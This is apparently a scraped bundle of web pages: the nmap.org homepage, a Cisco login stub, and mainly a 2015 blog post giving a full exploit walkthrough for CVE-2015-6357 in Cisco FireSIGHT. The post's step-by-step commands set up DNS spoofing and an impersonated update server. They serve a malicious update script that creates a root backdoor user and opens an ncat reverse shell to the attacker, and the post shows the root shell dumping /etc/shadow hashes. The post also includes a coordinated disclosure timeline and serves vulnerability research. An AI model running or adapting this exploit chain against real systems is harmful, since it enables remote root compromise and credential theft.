[programming](https://wadofstuff.blogspot.com/search/label/programming)
(9)

[python](https://wadofstuff.blogspot.com/search/label/python)
(14)

[ruby](https://wadofstuff.blogspot.com/search/label/ruby)
(1)

[security](https://wadofstuff.blogspot.com/search/label/security)
(3)

[serializer](https://wadofstuff.blogspot.com/search/label/serializer)
(4)

[servicetags](https://wadofstuff.blogspot.com/search/label/servicetags)
(2)

[smf](https://wadofstuff.blogspot.com/search/label/smf)
(6)

[solaris](https://wadofstuff.blogspot.com/search/label/solaris)
(31)

[splunk](https://wadofstuff.blogspot.com/search/label/splunk)
(4)

[sst jass](https://wadofstuff.blogspot.com/search/label/sst%20jass)
(1)

[testing](https://wadofstuff.blogspot.com/search/label/testing)
(1)

[zfs](https://wadofstuff.blogspot.com/search/label/zfs)
(3)

## Blog Archive

* ▼
  [2015](https://wadofstuff.blogspot.com/2015/)
  (2)
  + ▼
    [November](https://wadofstuff.blogspot.com/2015/11/)
    (1)
    - [CVE-2015-6357: FirePWNER Exploit for Cisco FireSIG...](https://wadofstuff.blogspot.com/2015/11/cve-2015-6357-firepwner-exploit-for.html)
  + ►
    [April](https://wadofstuff.blogspot.com/2015/04/)
    (1)

* ►
  [2012](https://wadofstuff.blogspot.com/2012/)
  (1)
  + ►
    [March](https://wadofstuff.blogspot.com/2012/03/)
    (1)

* ►
  [2011](https://wadofstuff.blogspot.com/2011/)
  (4)
  + ►
    [August](https://wadofstuff.blogspot.com/2011/08/)
    (1)
  + ►
    [July](https://wadofstuff.blogspot.com/2011/07/)
    (1)
  + ►
    [June](https://wadofstuff.blogspot.com/2011/06/)
    (1)
  + ►
    [February](https://wadofstuff.blogspot.com/2011/02/)
    (1)

* ►
  [2010](https://wadofstuff.blogspot.com/2010/)
  (4)
  + ►
    [December](https://wadofstuff.blogspot.com/2010/12/)
    (1)
  + ►
    [November](https://wadofstuff.blogspot.com/2010/11/)
    (1)
  + ►
    [September](https://wadofstuff.blogspot.com/2010/09/)
    (2)

* ►
  [2009](https://wadofstuff.blogspot.com/2009/)
  (18)
  + ►
    [November](https://wadofstuff.blogspot.com/2009/11/)
    (2)
  + ►
    [October](https://wadofstuff.blogspot.com/2009/10/)
    (2)
  + ►
    [August](https://wadofstuff.blogspot.com/2009/08/)
    (2)
  + ►
    [July](https://wadofstuff.blogspot.com/2009/07/)
    (4)
  + ►
    [May](https://wadofstuff.blogspot.com/2009/05/)
    (3)
  + ►
    [April](https://wadofstuff.blogspot.com/2009/04/)
    (1)
  + ►
    [March](https://wadofstuff.blogspot.com/2009/03/)
    (1)
  + ►
    [February](https://wadofstuff.blogspot.com/2009/02/)
    (3)

* ►
  [2008](https://wadofstuff.blogspot.com/2008/)
  (8)
  + ►
    [September](https://wadofstuff.blogspot.com/2008/09/)
    (1)
  + ►
    [June](https://wadofstuff.blogspot.com/2008/06/)
    (2)
  + ►
    [April](https://wadofstuff.blogspot.com/2008/04/)
    (3)
  + ►
    [March](https://wadofstuff.blogspot.com/2008/03/)
    (1)
  + ►
    [February](https://wadofstuff.blogspot.com/2008/02/)
    (1)

* ►
  [2007](https://wadofstuff.blogspot.com/2007/)
  (20)
  + ►
    [November](https://wadofstuff.blogspot.com/2007/11/)
    (2)
  + ►
    [October](https://wadofstuff.blogspot.com/2007/10/)
    (1)
  + ►
    [September](https://wadofstuff.blogspot.com/2007/09/)
    (2)
  + ►
    [August](https://wadofstuff.blogspot.com/2007/08/)
    (2)
  + ►
    [May](https://wadofstuff.blogspot.com/2007/05/)
    (2)
  + ►
    [March](https://wadofstuff.blogspot.com/2007/03/)
    (5)
  + ►
    [February](https://wadofstuff.blogspot.com/2007/02/)
    (4)
  + ►
    [January](https://wadofstuff.blogspot.com/2007/01/)
    (2)

## Projects

* [Wad of Stuff code repository](https://github.com/mattimustang/wadofstuff)
* [iPhoto Keyword Utilities](https://github.com/mattimustang/iphotokeywordutilities)

|  |  |
| --- | --- |

Travel theme. Theme images by [sandsun](http://www.istockphoto.com/googleimages.php?id=7944350&platform=blogger&langregion=en_GB). Powered by [Blogger](https://www.blogger.com).



=== Content from bst.cloudapps.cisco.com_cf6236ff_20250126_071552.html ===


Back

US

EN

×

Your email address belongs to an organization that also manages
your Cisco account login.

Log in to your organization to also log in to Cisco.

Organization Log In

×

Description here

Contact Support
[Privacy](https://www.cisco.com/c/en/us/about/legal/privacy-full.html)
[Terms &
Conditions](https://www.cisco.com/c/en/us/about/legal/terms-conditions.html)
[Cookies](https://www.cisco.com/c/en/us/about/legal/privacy-full.html#cookies)
[Trademarks](http://www.cisco.com/web/siteassets/legal/trademark.html)
[京ICP备05085544号-1](http://beian.miit.gov.cn)

## Cookies are required

Cookies are disabled on your browser. Please enable Cookies and refresh this page.

[Refresh](.)

![Cisco Identity](https://id.cisco.com/fs/bco/1/fs0a411g73DFKaj7K5d7)

## The page has timed out

If this page does not reload automatically, please refresh your browser.



=== Content from nmap.org_9ba698e9_20250126_071543.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[Download](/download.html)
[Reference Guide](/book/man.html)
[Book](/book/)
[Docs](/docs.html)
[Zenmap GUI](/zenmap/)
[In the Movies](/movies/)

[Get Nmap 7.95 here](/download)
## News

* Nmap.org has been redesigned! Our new mobile-friendly layout is also on [Npcap.com](https://npcap.com),
  [Seclists.org](https://seclists.org),
  [Insecure.org](https://insecure.org), and
  [Sectools.org](https://sectools.org).* Nmap 7.90 has been released with Npcap 1.00 along with dozens of other performance improvements, bug fixes, and feature enhancements! [[Release Announcement](https://seclists.org/nmap-announce/2020/1) | [Download page](https://nmap.org/download.html)]* After more than 7 years of development and 170 public pre-releases, we're delighted to announce Npcap version 1.00! [[Release Announcement](https://seclists.org/nmap-announce/2020/0) | [Download page](https://nmap.org/npcap/)]* Nmap 7.80 was released for DEFCON 27! [[release notes](https://seclists.org/nmap-announce/2019/0) | [download](https://nmap.org/download.html)]* Nmap turned 20 years old on September 1, 2017! Celebrate by reading [the original Phrack #51 article](/p51-11.html). [#Nmap20](https://twitter.com/hashtag/Nmap20)!* Nmap 7.50 is now available! [[release notes](https://seclists.org/nmap-announce/2017/3) | [download](https://nmap.org/download.html)]* Nmap 7 is now available! [[release notes](/7/) | [download](https://nmap.org/download.html)]* We're pleased to release our new and Improved [Icons of the Web](/favicon/) project—a 5-gigapixel interactive collage of the top million sites on the Internet!* Nmap has been discovered in two new movies! It's used to [hack Matt Damon's brain in Elysium](movies/#elysium) and also to [launch nuclear missiles in G.I. Joe: Retaliation](movies/#gijoe)!* We're delighted to announce Nmap 6.40 with 14 new [NSE scripts](/book/nse.html), hundreds of new [OS](/book/osdetect.html) and [version detection](/book/vscan.html) signatures, and many great new features! [[Announcement/Details](https://seclists.org/nmap-announce/2013/1)], [[Download Site](https://nmap.org/download.html)]* We just released Nmap 6.25 with 85 new NSE scripts, performance improvements, better OS/version detection, and more! [[Announcement/Details](https://seclists.org/nmap-hackers/2012/4)], [[Download Site](https://nmap.org/download.html)]* Any release as big as Nmap 6 is bound to uncover a few bugs. We've now fixed them with [Nmap 6.01](https://seclists.org/nmap-hackers/2012/3)!* Nmap 6 is now available! [[release notes](/6/) | [download](https://nmap.org/download.html)]* The security community has spoken! 3,000 of you shared favorite security tools for our relaunched [SecTools.Org](https://sectools.org). It is sort of like Yelp for security tools. Are you familiar with all of the [49 new tools](https://sectools.org/tag/new/) in this edition?* [Nmap 5.50 Released](https://seclists.org/nmap-hackers/2011/0): Now with Gopher protocol support! Our first stable release in a year includes 177 NSE scripts, 2,982 OS fingerprints, and 7,319 version detection signatures. Release focuses were the Nmap Scripting Engine, performance, Zenmap GUI, and the Nping packet analysis tool. [[Download page](https://nmap.org/download) | [Release notes](https://seclists.org/nmap-hackers/2011/0)]* Those who missed Defcon can now watch Fyodor and David Fifield demonstrate the power of the Nmap Scripting Engine. They give an overview of NSE, use it to explore Microsoft's global network, write an NSE script from scratch, and hack a webcam--all in 38 minutes! ([Presentation video](/presentations/BHDC10/))* *Icons of the Web*: explore favicons for the top million web sites with our [new poster and online viewer](/favicon).* We're delighted to announce the immediate, free availability of the [Nmap Security Scanner version 5.00](/5/). Don't miss the [top 5 improvements in Nmap 5](/5/#5changes).* After years of effort, we are delighted to release [Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning](/book/)!* We now have an active Nmap [Facebook page](http://facebook.com/nmap) and [Twitter feed](http://twitter.com/nmap/) to augment the [mailing lists](#lists). All of these options offer RSS feeds as well.

# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named “Security Product of the Year” by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

Nmap is ...

* Nmap
  Security
  Port Scanner
* **Flexible**: Supports dozens of advanced techniques for
  mapping out networks filled with IP filters, firewalls, routers, and
  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmap -v -A *targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
                magazine articles, several movies, dozens of books, and one comic book
                series. Visit the [press page](nmap_inthenews.html)
                for further details.* **Popular**: Thousands of people download Nmap every day, and
                  it is included with many operating systems (Redhat Linux, Debian
                  Linux, Gentoo, FreeBSD, OpenBSD, etc). It is among the top ten (out of
                  30,000) programs at the Freshmeat.Net repository. This is important
                  because it lends Nmap its vibrant development and user support
                  communities.

## Communication

Nmap users are encouraged to subscribe to the *Nmap-hackers*
mailing list. It is a low volume (6 posts in 2017), moderated list
for the most important announcements about Nmap, Insecure.org, and
related projects. You can join more than 128,000 current subscribers
by submitting your email address here:

(or subscribe with custom options from the [Nmap-hackers list info page](https://nmap.org/mailman/listinfo/announce))

We also have a development list for more hardcore members
(especially programmers) who are interested in helping the project by
helping with coding, testing, feature ideas, etc. New (test/beta)
versions of Nmap are sometimes released here prior to general
availability for QA purposes. You can subscribe at the [Nmap-dev list
info page](https://nmap.org/mailman/listinfo/dev).

Both lists are archived (along with many other security lists) at [Seclists.org](https://seclists.org).

Though it isn't nearly as active as the mailing lists, the official IRC channel is #nmap on [Freenode](http://freenode.net/) (irc.freenode.net).

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from wadofstuff.blogspot.com_b3b3f7ac_20250126_071545.html ===


# [Wad of Stuff](https://wadofstuff.blogspot.com/)

IT infrastructure automation, security research, tools, tips and tricks.

## Monday, 16 November 2015

### CVE-2015-6357: FirePWNER Exploit for Cisco FireSIGHT Management Center SSL Validation Vulnerability

## Introduction

On its own the [Cisco FireSIGHT Management Center Certificate Validation
Vulnerability](http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20151116-fmc "Cisco FireSIGHT Management Center Certificate Validation Vulnerability") is a **medium** severity vulnerability with a **CVSS** of **5.1**.
However, this vulnerability is an example of why SSL certificate validation is so
important. In this exploit I will demonstrate how the vulnerability can be leveraged
to obtain privileged remote command execution on a Cisco FireSIGHT system. The
exploit chains the SSL validation vulnerability with the software update process
on the Cisco FireSIGHT system to trick the target system into downloading a malicious
update and executing it to obtain a reverse shell with **root** privileges.

![AND THAT'S WHY YOU SHOULD ALWAYS VALIDATE SSL CERTIFICATES](https://i.imgflip.com/u60wm.jpg)

## The Vulnerability

The Cisco FireSIGHT Management Center appliance is used to manage Cisco
FirePOWER Intrusion Prevention Systems (IPS), also known as Sourcefire IPS.
FireSIGHT is responsible for downloading updated IPS signatures and installing
them on managed IPS devices.

The FireSIGHT Management Center allows an administrator to manually initiate an
update of the IPS rules or schedule the updates to occur daily/weekly/monthly.

When the FireSIGHT Management Center performs an update it uses the `curl` UNIX
command to perform the download from [Sourcefire Support](https://support.sourcefire.com "Sourcefire support"). The
invocation of the `curl` command is passed the `-k` (aka `--insecure`) option
which tells `curl` to not validate any SSL certificates presented by the server.

Here is the the `ps` output of the server downloading an update:

```
admin@FIRESIGHT01:/var/sf$ ps -auxwww | grep curl
root      8351  0.0  0.0  37396  2708 ?        S    02:02   0:00 /usr/local/bin/curl -k -o /var/sf/updates/Sourcefire_Geodb_Update-2015-08-17-002.sh https://support.sourcefire.com/auto-update/auto-dl.cgi/XX:XX:XX:XX:XX:XX:XX/Download/files/Sourcefire_Geodb_Update-2015-08-17-002.sh

```

FireSIGHT updates come in the form of a [makeself](https://github.com/megastep/makeself "makeself") generated shell script
that contains both UNIX Bourne shell commands as well as the binary data
to be delivered in the update. These shell update shell scripts are executed
directly on the FireSIGHT server as the local `www` user.

An attacker that is able to perform a man in the middle attack against
a FireSIGHT server can force it to connect to a spoofed version of the
[Sourcefire Support](https://support.sourcefire.com "Sourcefire support") web site and download a malicious update script that
will execute any command the attacker wishes on the FireSIGHT server.

The SSL Validation vulnerability enables this to occur resulting in the system
happily ignoring the attackers spoofed SSL certificate and downloading the
malicious update and executing it.

If the `curl` command were to validate the SSL certificate then it would fail
to download the malicious script and protect the FireSIGHT server from the
attacker.

This exploit demonstrates the danger of not validating the SSL certificate
by exploiting the vulnerability to gain remote command execution as the root
user.

## The Attack Scenario

The attack scenario is one where an attacker has attained the ability to man in
the middle the traffic from the FireSIGHT server to the
<https://support.sourcefire.com> web site. The simplest way to demonstrate this
is to set up a “compromised” DNS server that responds to queries for the domain
`support.sourcefire.com` with the IP address of a web server that the attacker
controls.

In a real attack scenario the attacker may use any number of man in the middle
techniques to acheive the same means. Such as:

* DNS cache poisioning
* ARP spoofing. e.g ettercap.

This exploit was tested against the following FireSIGHT Virtual Appliance versions:

* 5.2.0
* 5.3.0
* 5.4.0
* 5.4.1.1
* 5.4.1.2

In the PoC below the FireSIGHT server was assigned the IP address `192.168.1.99`.

The attacking host was running Kali Linux 2.0 though the set up below
should work on any Debian Linux based server. The IP address of the Kali host
in the example below is `192.168.1.1`. The Kali host is used to run the DNS server
as well as the spoofed [Sourcefire Support](https://support.sourcefire.com "Sourcefire support") web site.

## Set up dnsmasq

The exploit requires the ability to spoof the DNS response for
`support.sourcefire.com`. A dnsmasq server is run to provide this capability and
act as the “compromised” DNS server.

Install dnsmasq:

```
root@kali# apt-get install dnsmasq

```

Configure dnsmasq:

```
root@kali# cat << EOF > /etc/dnsmasq.d/firepnwer.conf
address=/support.sourcefire.com/192.168.1.1
server=8.8.8.8
EOF

```

Edit the IP address on the `address` line to be the address
of the web server you will serve the updates from.

Start dnsmasq:

```
root@kali# service dnsmasq start

```
## Set up nginx

A web server is required to serve the exploit to the FireSIGHT server when it
requests an update.

Install nginx web server:

```
root@kali# apt-get install nginx

```

Create a self signed certificate to impersonate `support.sourcefire.com`:

```
root@kali# mkdir /etc/nginx/ssl

root@kali# openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/nginx/ssl/nginx.key \
 -out /etc/nginx/ssl/nginx.crt

Country Name (2 letter code) [AU]:AU
State or Province Name (full name) [Some-State]:New South Wales
Locality Name (eg, city) []:Newcastle
Organization Name (eg, company) [Internet Widgits Pty Ltd]:FirePWNER Exploit.
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:support.sourcefire.com
Email Address []:

```

Configure nginx by replacing the contents of
`/etc/nginx/sites-available/default` with:

```
server {
    listen 80 default_server;
    listen [::]:80 default_server;

    listen 443 ssl;

    root /var/www/html;

    index index.html index.htm index.nginx-debian.html;

    server_name support.sourcefire.com;
    ssl_certificate /etc/nginx/ssl/nginx.crt;
    ssl_certificate_key /etc/nginx/ssl/nginx.key;

    location / {
        try_files $uri $uri/ =404;
    }

    # rewrite requests that contain the clients license key
    location ~* /auto-update/auto-dl.cgi/[A-F0-9][A-F0-9]:.* {
        rewrite ^(/auto-update/auto-dl.cgi)/[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]/(.*)$ $1/$2;
    }

    location /auto-update {
        root /var/www/html/firepwner;
    }

}

```

Start nginx:

```
root@kali# service nginx start

```
## Setting up the exploit

The FirePWNER exploit requires two files to be served from the web server. The
first file is the update manifest which is an XML file that contains a list of
the updates available, their download location and MD5 hashes.

First you need to create some directories:

```
root@kali# mkdir \
    /var/www/html/firepwner/auto-update/auto-dl.cgi/{Download/files,GetCurrent}

```

Then copy the exploit files into them:

```
root@kali# cp sf.xml /var/www/html/firepwner/auto-update/auto-dl.cgi/GetCurrent/sf.xml
root@kali# cp firepwner.sh \
    /var/www/html/firepwner/auto-update/auto-dl.cgi/Download/files/firepwner.sh

```

After copying these files you should be able to browse to
`http://192.168.1.1/auto-update/auto-dl.cgi/GetCurrent/sf.xml`

## Configure the FireSIGHT server DNS

Next, for exploit demonstration purposes, the FireSIGHT server needs to be configured to
use the “compromised” DNS server. Login to the FireSIGHT web portal and go to
`System > Local > Configure > Management Interfaces` and set the Primary DNS server to
the IP address of the “compromised” DNS server (192.168.1.1) and save the change.

## Running the Exploit

The exploit uses the `ncat` command installed by default on the FireSIGHT
server to create a reverse shell to the Kali host. On the Kali host you need to
listen for the reverse shell connection from the FireSIGHT server:

```
root@kali# ncat -v -l 4444

```

Then on the FireSIGHT web portal browse to `System > Updates > Rule Updates`
and select `Download new rule update from the Support Site` and click the
`Import` button. The server will then download the `sf.xml` update manifest from
the attacker’s server, see that there is an update available and will
download the update and execute it as the `www` user. The update/exploit script
below takes advantage of the fact that the `www` user has a number of `sudo` commands
it can run including `useradd`. The exploit creates a new `toor` user with an
empty passwd and then uses `su` to elevate privileges and start a reverse shell
connection back to the attackers server.

```
#!/bin/sh
# add a new UID 0 "toor" user with an empty password
sudo useradd -o -p '$1$FuV6TnrC$rKJCjOHJXuFhl2djLOBmF.' -g root -c toor -u 0 -s /bin/sh \
 -d /root toor
# su to toor and start the reverse shell
echo | su - toor -c "/usr/local/sf/nmap/bin/ncat -e /bin/sh support.sourcefire.com 4444"
exit 0

```

The exploit script may be changed to run any other desired commands. If the
script is changed then the `<md5sum>` XML tag value in `sf.xml` must be updated
with the new MD5 hash of the exploit script.

This is an example of the output you should see on the Kali host when the
exploit is successful and a remote shell on the FireSIGHT server is opened and
the `id` and `cat /etc/passwd` commands are run:

```
root@kali# ncat -v -l 4444
Ncat: Version 6.49BETA4 ( http://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.1.99.
Ncat: Connection from 192.168.1.99:41637.
id
uid=0(root) gid=0(root) groups=0(root)
cat /etc/shadow
root:x:11869:0:::::
bin:*:9797:0:::::
daemon:*:9797:0:::::
mysql:*:9797:0:::::
nobody:*:9797:0:::::
sshd:*:9797:0:::::
www:*:9797:0:::::
sfsnort:*:9797:0:::::
sfremediation:*:9797:0:::::
sfrna:*:9797:0:::::
snorty:*:9797:0:::::
admin:$6$GCOeXpyR$Qhq6Eq5aSW8n.15RajwYrHVLud8NaN4aKEkVXC43I5m/X.ux/bgIHAplYifOaxTIxaIThqOBGmZgO5aey5tjE/:11869:0:::::
toor:$1$FuV6TnrC$rKJCjOHJXuFhl2djLOBmF.:16679:0:99999:7:::

```
## Obtaining the Exploit

The files used in this exploit may be obtained from [github](https://github.com/mattimustang/firepwner "CVE-2015-6357 Exploit Code").

## Disclosure Timeline

* 2015-08-31 Vulnerability discovered in FireSIGHT 5.4.x and exploit developed
  by Matthew Flanagan.
* 2015-09-01 Initial contact made with Cisco PSIRT psirt@cisco.com.
* 2015-09-01 PSIRT responded asking for more information.
* 2015-09-01 Matthew Flanagan provided PSIRT with full write up and exploit of vulnerability.
* 2015-09-02 PSIRT raised FireSIGHT defect and incident PSIRT-190974966.
* 2015-09-15 Matthew Flanagan reported to Cisco PSIRT that versions 5.2.0 and 5.3.0 are also
  vulnerable.
* 2015-10-16 PSIRT advised me of the CVSS score they assigned to the vulnerability.
* 2015-11-09 PSIRT assigned CVE ID CVE-2015-6357.
* 2015-11-16 [Cisco FireSIGHT Management Center Certificate Validation
  Vulnerability](http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20151116-fmc "Cisco FireSIGHT Management Center Certificate Validation Vulnerability") published.
* 2015-11-16 Matthew Flanagan’s findings published.

Posted by

[Matthew Flanagan](https://www.blogger.com/profile/15093905875465763876 "author profile")

at

[21:20](https://wadofstuff.blogspot.com/2015/11/cve-2015-6357-firepwner-exploit-for.html "permanent link")

[![](https://resources.blogblog.com/img/icon18_email.gif)](https://www.blogger.com/email-post/4770774760495172381/1013694973102085061 "Email Post")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4770774760495172381&postID=1013694973102085061&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=1013694973102085061&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=1013694973102085061&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=1013694973102085061&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=1013694973102085061&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=1013694973102085061&target=pinterest "Share to Pinterest")

Labels:
[cisco](https://wadofstuff.blogspot.com/search/label/cisco),
[cve](https://wadofstuff.blogspot.com/search/label/cve),
[exploit](https://wadofstuff.blogspot.com/search/label/exploit),
[security](https://wadofstuff.blogspot.com/search/label/security)

#### No comments:

[Post a Comment](https://www.blogger.com/comment/fullpage/post/4770774760495172381/1013694973102085061)

[Older Post](https://wadofstuff.blogspot.com/2015/04/project-repositories-have-moved-to.html "Older Post")

[Home](https://wadofstuff.blogspot.com/)

Subscribe to:
[Post Comments (Atom)](https://wadofstuff.blogspot.com/feeds/1013694973102085061/comments/default)

## About Me

[Matthew Flanagan](https://www.blogger.com/profile/15093905875465763876)

[View my complete profile](https://www.blogger.com/profile/15093905875465763876)

## Subscribe To

![](https://resources.blogblog.com/img/widgets/arrow_dropdown.gif)
![](https://resources.blogblog.com/img/icon_feed12.png)
Posts

[![](https://resources.blogblog.com/img/widgets/subscribe-netvibes.png)](https://www.netvibes.com/subscribe.php?url=https%3A%2F%2Fwadofstuff.blogspot.com%2Ffeeds%2Fposts%2Fdefault)
[![](https://resources.blogblog.com/img/widgets/subscribe-yahoo.png)](https://add.my.yahoo.com/content?url=https%3A%2F%2Fwadofstuff.blogspot.com%2Ffeeds%2Fposts%2Fdefault)
[![](https://resources.blogblog.com/img/icon_feed12.png)
Atom](https://wadofstuff.blogspot.com/feeds/posts/default)

![](https://resources.blogblog.com/img/widgets/arrow_dropdown.gif)
![](https://resources.blogblog.com/img/icon_feed12.png)
Posts

![](https://resources.blogblog.com/img/widgets/arrow_dropdown.gif)
![](https://resources.blogblog.com/img/icon_feed12.png)
Comments

[![](https://resources.blogblog.com/img/widgets/subscribe-netvibes.png)](https://www.netvibes.com/subscribe.php?url=https%3A%2F%2Fwadofstuff.blogspot.com%2Ffeeds%2F1013694973102085061%2Fcomments%2Fdefault)
[![](https://resources.blogblog.com/img/widgets/subscribe-yahoo.png)](https://add.my.yahoo.com/content?url=https%3A%2F%2Fwadofstuff.blogspot.com%2Ffeeds%2F1013694973102085061%2Fcomments%2Fdefault)
[![](https://resources.blogblog.com/img/icon_feed12.png)
Atom](https://wadofstuff.blogspot.com/feeds/1013694973102085061/comments/default)

![](https://resources.blogblog.com/img/widgets/arrow_dropdown.gif)
![](https://resources.blogblog.com/img/icon_feed12.png)
Comments

## Labels

[advisory](https://wadofstuff.blogspot.com/search/label/advisory)
(1)

[apache](https://wadofstuff.blogspot.com/search/label/apache)
(2)

[apple](https://wadofstuff.blogspot.com/search/label/apple)
(3)

[buildbot](https://wadofstuff.blogspot.com/search/label/buildbot)
(2)

[checkpoint](https://wadofstuff.blogspot.com/search/label/checkpoint)
(1)

[cisco](https://wadofstuff.blogspot.com/search/label/cisco)
(1)

[cve](https://wadofstuff.blogspot.com/search/label/cve)
(1)

[dhcp](https://wadofstuff.blogspot.com/search/label/dhcp)
(2)

[django](https://wadofstuff.blogspot.com/search/label/django)
(12)

[dtrace](https://wadofstuff.blogspot.com/search/label/dtrace)
(1)

[exploit](https://wadofstuff.blogspot.com/search/label/exploit)
(1)

[flash archive](https://wadofstuff.blogspot.com/search/label/flash%20archive)
(4)

[forms](https://wadofstuff.blogspot.com/search/label/forms)
(2)

[infrastructure](https://wadofstuff.blogspot.com/search/label/infrastructure)
(5)

[iphoto](https://wadofstuff.blogspot.com/search/label/iphoto)
(3)

[ipv4](https://wadofstuff.blogspot.com/search/label/ipv4)
(6)

[ipv6](https://wadofstuff.blogspot.com/search/label/ipv6)
(7)

[jass](https://wadofstuff.blogspot.com/search/label/jass)
(7)

[json](https://wadofstuff.blogspot.com/search/label/json)
(3)

[jumpstart](https://wadofstuff.blogspot.com/search/label/jumpstart)
(10)

[macosx](https://wadofstuff.blogspot.com/search/label/macosx)
(2)

[models](https://wadofstuff.blogspot.com/search/label/models)
(1)

[networking](https://wadofstuff.blogspot.com/search/label/networking)
(4)

[nfs](https://wadofstuff.blogspot.com/search/label/nfs)
(2)

[nmap](https://wadofstuff.blogspot.com/search/label/nmap)
(2)

